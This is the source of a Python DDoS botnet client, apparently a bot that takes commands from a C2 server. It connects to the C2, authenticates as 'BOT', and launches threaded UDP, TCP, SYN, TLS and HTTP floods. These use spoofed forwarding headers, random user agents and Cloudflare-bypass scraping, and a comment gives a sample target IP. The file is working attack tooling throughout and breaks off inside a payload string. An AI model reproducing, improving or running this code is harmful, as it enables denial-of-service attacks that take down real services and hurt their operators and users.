import socket,threading,time,requests,random,cloudscraper,string,datetime,os,socks,ssl,cfscrape
from fake_headers import Headers
from fake_useragent import FakeUserAgent,UserAgent
from cryptography.fernet import Fernet
from os import urandom as randbytes
from urllib.parse import urlparse

SOCKS_SENT_DOS = []
MAKE_CONNECT_DOS = True

def UDP_CLOSE_SEND(ip,port,secs,make_connection,booter_sent,size):
    global SOCKS_SENT_DOS,MAKE_CONNECT_DOS

    while time.time() < secs:
        if len(SOCKS_SENT_DOS) == 0:
            print("NO CONNECTION")
            MAKE_CONNECT_DOS = True
            if MAKE_CONNECT_DOS == True:
                try:
                    S = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                    S.sendto(random.randbytes(size),(ip,port))
                    MAKE_CONNECT_DOS = False
                    print('\nMAKE CONNECTION')
                    SOCKS_SENT_DOS.append(S)
                except: 
                    S.close()
        else:
            if len(SOCKS_SENT_DOS) > make_connection:
                print("\nLOW CONNECTION")
                MAKE_CONNECT_DOS = True
            else:
                for DOS in SOCKS_SENT_DOS:
                    print('\nFLOODING')
                    try:
                        for _ in range(booter_sent):
                            DOS.sendto(random.randbytes(size),(ip,port))
                            DOS.sendto(random._urandom(size),(ip,port))
                            DOS.sendto(random.randbytes(size),(ip,port))
                            DOS.sendto(random._urandom(size),(ip,port))
                            DOS.sendto(random.randbytes(size),(ip,port))
                    except:
                        SOCKS_SENT_DOS.remove(DOS)
                    SOCKS_SENT_DOS.remove(DOS)
                print("DONE CONNECTION")

def generate_url_path(num):
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, int(num)))
    return data

def spoof(target):
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    spoofip = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return (
        "X-Forwarded-Proto: Http\r\n"
        f"X-Forwarded-Host: {target}, 1.1.1.1\r\n"
        f"Via: {spoofip}\r\n"
        f"Client-IP: {spoofip}\r\n"
        f'X-Forwarded-For: {spoofip}\r\n'
        f'Real-IP: {spoofip}\r\n'
    )

def tls_flooding(ip,host,port,type_attack,booter):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tls_sock = ssl.wrap_socket(sock)
    url_path = generate_url_path(5)
    tls_sock.connect((ip,port))
    for i in range(int(booter)):
        http_req = f'{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n'.encode()
        fernet_keys = Fernet.generate_key()
        fernet_encryptor = Fernet(fernet_keys)
        try:
            tls_sock.write(fernet_encryptor.encrypt(http_req))
            tls_sock.write(fernet_encryptor.encrypt(http_req))
            tls_sock.write(fernet_encryptor.encrypt(http_req))
            tls_sock.write(fernet_encryptor.encrypt(http_req))
            tls_sock.write(http_req)
            tls_sock.write(http_req)
            tls_sock.write(http_req)
            tls_sock.write(http_req)
            tls_sock.write(http_req)
        except:
            pass
    tls_sock.close()

def attack_pyflooder(ip,host, port,type_attack): # .PYFLOODER http://51.159.30.249 80 1
    url_path = generate_url_path(5)
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        dos.connect((ip, port))

        byt = (f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
        dos.send(byt)
        for tread in range(500):
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            for tread in range(500):
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
        dos.send(byt)
        for tread in range(500):
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            for tread in range(500):
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
        dos.send(byt)
    except socket.error:
        pass
    finally:
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()

def install_update():
    os.system('pip uninstall fake-useragent -q')
    os.system('pip install fake-useragent -q')
    os.system('python3 -m pip uninstall fake-useragent -q -y')
    os.system('python3 -m pip install fake-useragent -q -y')

def user_gen():
    ua = FakeUserAgent()
    data = ua.random
    return data

def user_gen2():
    ua = UserAgent()
    data = ua.random
    return data

def rand_ua(mode):
    if "FakeUser" in mode:
        ua = user_gen()
    else:
        ua = user_gen2()
    return ua

C2_ADDRESS  = "127.0.0.1"
C2_PORT     = 8080

def header_http(host,type_attack,mode_type,ver):
    if mode_type == "PYF":
        url_path = generate_url_path(5)
        type_attack_load = f"{type_attack} /{url_path} HTTP/{ver}\nHost: {host}\n\n".encode()
    elif mode_type == "NULL":
        url_path = generate_url_path(1)
        type_attack_load2 =  f"{type_attack} /{url_path} HTTP/{ver}\r\nHost: {host}\r\n"
        type_attack_load2 += "User-Agent: null\r\n"
        type_attack_load2 += "Referrer: null\r\n"
        type_attack_load2 += f"{spoof(host)}\r\n"
        type_attack_load = type_attack_load2.encode()
    elif mode_type == "SPOOF":
        url_path = generate_url_path(1)
        random_list = random.choice(("FakeUser","User"))
        headers_ua = ""
        if "FakeUser" in random_list:
            headers_ua = {'User-Agent': f'{rand_ua("FakeUser")}'}
        else:
            headers_ua = {'User-Agent': f'{rand_ua("User")}'}
        type_attack_load2 =  f"{type_attack} /{url_path} HTTP/{ver}\r\nHost: {host}\r\n"
        type_attack_load2 += f"User-Agent: {headers_ua}\r\n"
        type_attack_load2 += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
        type_attack_load2 += f"{spoof(host)}"
        type_attack_load2 += "Connection: Keep-Alive\r\n\r\n"
        type_attack_load = type_attack_load2.encode()
    elif mode_type == "HTTP":
        url_path = generate_url_path(5)
        random_list = random.choice(("FakeUser","User"))
        headers_ua = ""
        if "FakeUser" in random_list:
            headers_ua = {'User-Agent': f'{rand_ua("FakeUser")}'}
        else:
            headers_ua = {'User-Agent': f'{rand_ua("User")}'}
        type_attack_load = f'{type_attack} /{url_path} HTTP/{ver}\r\nHost: {host}\r\nUser-Agent: {headers_ua}\r\nConnection: keep-alive\r\n\r\n'.encode()
    elif mode_type == "PYF2":
        url_path = generate_url_path(1)
        type_attack_load = f"{type_attack} /{url_path} HTTP/{ver}\nHost: {host}\n\n".encode()
    elif mode_type == "NULL2":
        url_path = generate_url_path(5)
        type_attack_load2 =  f"{type_attack} /{url_path} HTTP/{ver}\r\nHost: {host}\r\n"
        type_attack_load2 += "User-Agent: null\r\n"
        type_attack_load2 += "Referrer: null\r\n"
        type_attack_load2 += f"{spoof(host)}\r\n"
        type_attack_load = type_attack_load2.encode()
    elif mode_type == "SPOOF2":
        url_path = generate_url_path(5)
        random_list = random.choice(("FakeUser","User"))
        headers_ua = ""
        if "FakeUser" in random_list:
            headers_ua = {'User-Agent': f'{rand_ua("FakeUser")}'}
        else:
            headers_ua = {'User-Agent': f'{rand_ua("User")}'}
        type_attack_load2 =  f"{type_attack} /{url_path} HTTP/{ver}\r\nHost: {host}\r\n"
        type_attack_load2 += f"User-Agent: {headers_ua}\r\n"
        type_attack_load2 += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
        type_attack_load2 += f"{spoof(host)}"
        type_attack_load2 += "Connection: Keep-Alive\r\n\r\n"
        type_attack_load = type_attack_load2.encode()
    elif mode_type == "HTTP2":
        url_path = generate_url_path(1)
        random_list = random.choice(("FakeUser","User"))
        headers_ua = ""
        if "FakeUser" in random_list:
            headers_ua = {'User-Agent': f'{rand_ua("FakeUser")}'}
        else:
            headers_ua = {'User-Agent': f'{rand_ua("User")}'}
        type_attack_load = f'{type_attack} /{url_path} HTTP/{ver}\r\nHost: {host}\r\nUser-Agent: {headers_ua}\r\nConnection: keep-alive\r\n\r\n'.encode()
    elif mode_type == "PPS":
        type_attack_load = f'{type_attack} / HTTP/{ver}\r\n\r\n'.encode()
    elif mode_type == "PPS2":
        url_path = generate_url_path(5)
        type_attack_load = f'{type_attack} /{url_path} HTTP/{ver}\r\n\r\n'.encode()
    return type_attack_load

def attack_http_sent1(ip, port,byt):
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        dos.connect((ip, port))
        dos.send(byt)
        for tread in range(500):
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            for tread in range(500):
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
        dos.send(byt)
        for tread in range(500):
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            for tread in range(500):
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
        dos.send(byt)
    except socket.error:
        pass
    finally:
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()

def attack_sent1(ip, port, secs,payload):

    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def attack_syn(ip, port, secs):
    
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(0)
        try:
            dport = random.randint(1, 65535) if port == 0 else port
            s.connect((ip, dport))
            s.connect((ip, dport))
            s.connect((ip, dport))
            s.connect((ip, dport))
            s.connect((ip, dport))
            s.connect((ip, dport))
        except:
            pass

def CFB(url,method,secs):
    while time.time() < secs:

        random_list = random.choice(("FakeUser","User"))
        headers = ""
        if "FakeUser" in random_list:
            headers = {'User-Agent': f'{rand_ua("FakeUser")}'}
        else:
            headers = {'User-Agent': f'{rand_ua("User")}'}

        scraper = cloudscraper.create_scraper()
        scraper = cloudscraper.CloudScraper()
        if "get" in method:
            for _ in range(1500):
                scraper.get(url,headers=headers, timeout=15)
        elif "post" in method:
            for _ in range(1500):
                scraper.post(url,headers=headers, timeout=15)
        elif "patch" in method:
            for _ in range(1500):
                scraper.patch(url,headers=headers, timeout=15)
        elif "put" in method:
            for _ in range(1500):
                scraper.put(url,headers=headers, timeout=15)
        elif "head" in method:
            for _ in range(1500):
                scraper.head(url,headers=headers, timeout=15)
        elif "delete" in method:
            for _ in range(1500):
                scraper.delete(url,headers=headers, timeout=15)
        elif "options" in method:
            for _ in range(1500):
                scraper.options(url,headers=headers, timeout=15)
        elif "all" in method:
            for _ in range(1500):
                scraper.get(url,headers=headers, timeout=15)
                scraper.post(url,headers=headers, timeout=15)
                scraper.patch(url,headers=headers, timeout=15)
                scraper.put(url,headers=headers, timeout=15)
                scraper.head(url,headers=headers, timeout=15)
                scraper.delete(url,headers=headers, timeout=15)
                scraper.options(url,headers=headers, timeout=15)

def attack_udp(ip, port, secs, size,mode):
    
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        for _ in range(1500):
            if mode == "URANDOM":
                data = random._urandom(size)
            elif mode == "RANDBYTES":
                data = random.randbytes(size)
            elif mode == "OS_URANDOM":
                data = os.urandom(size)
            elif mode == "OS_RANDBYTES":
                data = randbytes(size)
            elif mode == "PY_BOTNET":
                data = "A" * size
                data = data.encode()
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))
            s.sendto(data, (ip, dport))

def attack_tcp(ip, port, secs, size,mode):
    
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < secs:
                for _ in range(1500):
                    if mode == "URANDOM":
                        s.send(random._urandom(size))
                        s.send(random._urandom(size))
                        s.send(random._urandom(size))
                        s.send(random._urandom(size))
                        s.send(random._urandom(size))
                        s.send(random._urandom(size))
                    elif mode == "RANDBYTES":
                        s.send(random.randbytes(size))
                        s.send(random.randbytes(size))
                        s.send(random.randbytes(size))
                        s.send(random.randbytes(size))
                        s.send(random.randbytes(size))
                        s.send(random.randbytes(size))
                    elif mode == "OS_URANDOM":
                        s.send(os.urandom(size))
                        s.send(os.urandom(size))
                        s.send(os.urandom(size))
                        s.send(os.urandom(size))
                        s.send(os.urandom(size))
                        s.send(os.urandom(size))
                    elif mode == "OS_RANDBYTES":
                        s.send(randbytes(size))
                        s.send(randbytes(size))
                        s.send(randbytes(size))
                        s.send(randbytes(size))
                        s.send(randbytes(size))
                        s.send(randbytes(size))
                    elif mode == "PY_BOTNET":
                        data = "A" * size
                        s.send(data.encode())
                        s.send(data.encode())
                        s.send(data.encode())
                        s.send(data.encode())
                        s.send(data.encode())
        except:
            pass

def REQ_attack_ddos(ip,secs):
     while time.time() < secs:
         
        try:
            requests.get(ip)
        except:
            try:
                requests.post(ip)
            except:
                try:
                    requests.head(ip)
                except:
                    pass

def REQ_attack(ip,method,secs):
     while time.time() < secs:
        random_list = random.choice(("FakeUser","User"))
        headers = ""
        if "FakeUser" in random_list:
            headers = {'User-Agent': f'{rand_ua("FakeUser")}'}
        else:
            headers = {'User-Agent': f'{rand_ua("User")}'}
        if "get" in method:
            for _ in range(1500):
                requests.get(ip,headers=headers)
        elif "post" in method:
            for _ in range(1500):
                requests.post(ip,headers=headers)
        elif "put" in method:
            for _ in range(1500):
                requests.put(ip,headers=headers)
        elif "patch" in method:
            for _ in range(1500):
                requests.patch(ip,headers=headers)
        elif "delete" in method:
            for _ in range(1500):
                requests.delete(ip,headers=headers)
        elif "head" in method:
            for _ in range(1500):
                requests.head(ip,headers=headers)
        elif "options" in method:
            for _ in range(1500):
                requests.options(ip,headers=headers)
        elif "all" in method:
            for _ in range(1500):
                requests.get(ip,headers=headers)
                requests.post(ip,headers=headers)
                requests.put(ip,headers=headers)
                requests.patch(ip,headers=headers)
                requests.delete(ip,headers=headers)
                requests.head(ip,headers=headers)
                requests.options(ip,headers=headers)

def generate_url_path(num):
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, int(num)))
    return data

def get_target2(url):
    print(url)
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
        pass
    return target

def attack_cfb(secs, target,payload,mode):
    if target['scheme'] == 'https':
        packet = socks.socksocket()
        if mode == "NEW":
            packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 65536)
            packet.settimeout(65536)
            packet.connect((str(target['host']), int(target['port'])))
            packet.connect_ex((str(target['host']), int(target['port'])))
            packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
        else:
            packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            packet.connect((str(target['host']), int(target['port'])))
            packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet = socks.socksocket()
        if mode == "NEW":
            packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 65536)
            packet.settimeout(65536)
            packet.connect((str(target['host']), int(target['port'])))
            packet.connect_ex((str(target['host']), int(target['port'])))
        else:
            packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            packet.connect((str(target['host']), int(target['port'])))

    while time.time() < secs:
        try:
            for _ in range(2500):
                if mode == "NEW":
                    packet.send(payload)
                    packet.sendall(payload)
                else:
                    packet.send(payload)
        except:
            packet.close()
            pass

def main():
    global SOCKS_SENT_DOS,MAKE_CONNECT_DOS
    c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    while 1:
        try:
            c2.connect((C2_ADDRESS, C2_PORT))
            while 1:
                data = c2.recv(65536).decode()
                if 'Username' in data:
                    c2.send('BOT'.encode())
                    break
            while 1:
                data = c2.recv(65536).decode()
                if 'Password' in data:
                    c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                    break
            break
        except:
            time.sleep(5)
    while 1:
        try:
            data = c2.recv(99999999).decode().strip()
            if not data:
                break
            args = data.split(' ')
            command = args[0].upper()
            if command == ".HTTP_REQ":
                url = args[1]
                method = args[2]
                secs = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=REQ_attack, args=(url,method, secs), daemon=True).start()
            elif command == ".HTTP_DFB":
                url = args[1]
                secs = time.time() + int(args[2])
                threads = int(args[3])
                for _ in range(threads):
                    threading.Thread(target=REQ_attack_ddos, args=(url, secs), daemon=True).start()
            elif command == ".HTTP_ALL":
                url = args[1]
                method = args[2]
                secs = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=REQ_attack, args=(url,method, secs), daemon=True).start()
                    threading.Thread(target=REQ_attack_ddos, args=(url, secs), daemon=True).start()
                    threading.Thread(target=CFB, args=(url,method, secs), daemon=True).start()
                    threading.Thread(target=CFB, args=(url,method, secs), daemon=True).start()
                    threading.Thread(target=CFB, args=(url,method, secs), daemon=True).start()
                    threading.Thread(target=CFB, args=(url,method, secs), daemon=True).start()
                    threading.Thread(target=CFB, args=(url,method, secs), daemon=True).start()
            elif command == ".HTTP_CFB":
                url = args[1]
                method = args[2]
                secs = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=CFB, args=(url,method, secs), daemon=True).start()
                    threading.Thread(target=CFB, args=(url,method, secs), daemon=True).start()
                    threading.Thread(target=CFB, args=(url,method, secs), daemon=True).start()
                    threading.Thread(target=CFB, args=(url,method, secs), daemon=True).start()
                    threading.Thread(target=CFB, args=(url,method, secs), daemon=True).start()
            elif command == '.TCP':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                mode = args[5]
                threads = int(args[6])

                for _ in range(threads):
                    threading.Thread(target=attack_tcp, args=(ip, port, secs, size,mode), daemon=True).start()
            elif command == '.SYN':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
            elif command == '.TLS_SMALL':
                 ip = ""
                 host = ""
                 url = str(args[1])
                 port = int(args[2])
                 secs = time.time() + int(args[3])
                 type_attack = str(args[4])
                 num_booter = int(args[5])
                 threads = int(args[6])

                 try:
                     host = str(url).replace("https://", "").replace("http://", "").replace("www.", "")
                     ip = socket.gethostbyname(host)
                 except socket.gaierror:
                    print("CAN'T GET IP . . .")

                 while time.time() < secs:
                     for _ in range(num_booter):
                         th1 = threading.Thread(target=tls_flooding,args=(ip,host, port,type_attack,num_booter))
                         th1.start()
                         th1 = threading.Thread(target=tls_flooding,args=(ip,host, port,type_attack,num_booter))
                         th1.start()
                         th1 = threading.Thread(target=tls_flooding,args=(ip,host, port,type_attack,num_booter))
                         th1.start()
                         th1 = threading.Thread(target=tls_flooding,args=(ip,host, port,type_attack,num_booter))
                         th1.start()
            elif command == '.PYF':
                 ip = ""
                 host = ""
                 url = str(args[1])
                 port = int(args[2])
                 secs = time.time() + int(args[3])
                 type_attack = str(args[4])
                 num_booter = int(args[5])
                 threads = int(args[6])

                 try:
                     host = str(url).replace("https://", "").replace("http://", "").replace("www.", "")
                     ip = socket.gethostbyname(host)
                 except socket.gaierror:
                    print("CAN'T GET IP . . .")

                 while time.time() < secs:
                     for _ in range(num_booter):
                        t1 = threading.Thread(target=attack_pyflooder, args=(ip,host, port,type_attack))
                        t1.start()
                        t1 = threading.Thread(target=attack_pyflooder, args=(ip,host, port,type_attack))
                        t1.start()
                        t1 = threading.Thread(target=attack_pyflooder, args=(ip,host, port,type_attack))
                        t1.start()
                        t1 = threading.Thread(target=attack_pyflooder, args=(ip,host, port,type_attack))
                        t1.start()
                        t1 = threading.Thread(target=attack_pyflooder, args=(ip,host, port,type_attack))
                        t1.start()
            elif command == '.CFB_SOCK':
                 print('ATTACKING . . .')
                 url = args[1]
                 port = int(args[2])
                 secs = time.time() + int(args[3])
                 type_attack_load = str(args[4])
                 mode_type = args[5]
                 ver_load = args[6]
                 mode = args[7]
                 num_booter = int(args[8])
                 threads = int(args[9])
                 target = get_target2(url)
                 host = target['host']
                 for _ in range(threads):
                     for _ in range(num_booter):
                         type_attack = header_http(host,type_attack_load,mode_type,ver_load)
                         print(type_attack)
                         thd = threading.Thread(target=attack_cfb,args=(secs,target,type_attack,mode))
                         thd.start()
                         type_attack = header_http(host,type_attack_load,mode_type,ver_load)
                         print(type_attack)
                         thd = threading.Thread(target=attack_cfb,args=(secs,target,type_attack,mode))
                         thd.start()
            elif command == '.HTTP':
                 ip = ""
                 host = ""
                 url = str(args[1])
                 port = int(args[2])
                 secs = time.time() + int(args[3])
                 type_attack_load = str(args[4])
                 mode_type = args[5]
                 ver_load = args[6]
                 num_booter = int(args[7])
                 threads = int(args[8])

                 try:
                     host = str(url).replace("https://", "").replace("http://", "").replace("www.", "")
                     ip = socket.gethostbyname(host)
                 except socket.gaierror:
                    print("CAN'T GET IP . . .")

                 while time.time() < secs:
                     for _ in range(num_booter):
                         type_attack = header_http(host,type_attack_load,mode_type,ver_load)
                         t1 = threading.Thread(target=attack_http_sent1, args=(ip, port,type_attack))
                         t1.start()
                         type_attack = header_http(host,type_attack_load,mode_type,ver_load)
                         t1 = threading.Thread(target=attack_http_sent1, args=(ip, port,type_attack))
                         t1.start()
            elif command == '.RAND_STD':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    payload = random.choice(('\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff',"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A","\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA""\x0D\x1E\x1F\x12\x06\x62\x26\x12\x62\x0D\x12\x01\x06\x0D\x1C\x01\x32\x12\x6C\x63\x1B\x32\x6C\x63\x3C\x32\x62\x63\x6C\x26\x12\x1C\x12\x6C\x63\x62\x06\x12\x21\x2D\x32\x62\x11\x2D\x21\x32\x62\x10\x12\x01\x0D\x12\x30\x21\x2D\x30\x13\x1C\x1E\x10\x01\x10\x3E\x3C\x32\x37\x01\x0D\x10\x12\x12\x30\x2D\x62\x10\x12\x1E\x10\x0D\x12\x1E\x1C\x10\x12\x0D\x01\x10\x12\x1E\x1C\x30\x21\x2D\x32\x30\x2D\x30\x2D\x21\x30\x21\